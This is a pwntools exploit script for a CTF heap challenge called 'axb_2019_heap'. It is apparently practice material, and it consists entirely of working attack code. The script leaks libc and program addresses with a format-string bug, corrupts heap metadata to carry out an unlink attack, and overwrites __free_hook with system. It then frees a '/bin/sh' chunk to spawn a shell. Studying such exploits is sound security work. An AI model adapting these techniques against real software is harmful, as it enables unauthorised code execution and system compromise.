from pwn import *

local = 1 
if local == 1:
	p = process('./axb_2019_heap')

elf = ELF('./axb_2019_heap')
libc = ELF('./libc.so.6')

def dbg():
	context.log_level = 'debug'

def pa():
	pause()

def fmt(name):
	p.recvuntil('Enter your name:')
	p.sendline(name)

def add(index,size,content):
	p.sendlineafter('>> ','1')
	p.sendlineafter('Enter the index you want to create (0-10):',str(index))
	p.sendlineafter('Enter a size:',str(size))
	p.sendlineafter('Enter the content:',content)

def free(index):
	p.sendlineafter('>> ','2')
	p.sendlineafter('Enter an index:',str(index))

def edit(index,content):
	p.sendlineafter('>> ','4')
	p.sendlineafter('Enter an index:',str(index))
	p.sendafter('Enter the content:',content)

#dbg()
print("======= step 1 : by use fmtstr leak address libc + bss =======")
fmt('%11$p%15$p')
p.recvuntil('Hello,')
main = int(p.recv(15),16) - 28
__libc_start_main = int(p.recv(15),16) - 240
print("main ---> " + hex(main))
print("__libc_start_main ----> " + hex(__libc_start_main))

heaparray = main - 0x116A + 0x202060
print("heaparray in bss(DATA) ----> " + hex(heaparray))
libc_base = __libc_start_main - libc.sym['__libc_start_main']
print("libc base ---->" + hex(libc_base))

add(0,0x98,'A')		#chunk0
add(1,0xa0,'B')		#chunk1
add(2,0x90,'/bin/sh\x00')	#chunk2

print("======== step 2: unlink =========")
fd = heaparray - 0x18
bk = heaparray - 0x10
chunk0 = p64(0) + p64(0x91) + p64(fd) + p64(bk) +p64(0) * 14 + p64(0x90) + p64(0xb0)
edit(0,chunk0)
free(1)

print("======= step 3: attack free@got ======")
free = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

payload = p64(0) * 3 + p64(free) + p64(0x8) + b'\n'
edit(0,payload)

payload = p64(system)
print(hex(system))

#dbg()
edit(0,payload)

p.sendline('2')	
p.sendline('2')
p.interactive()
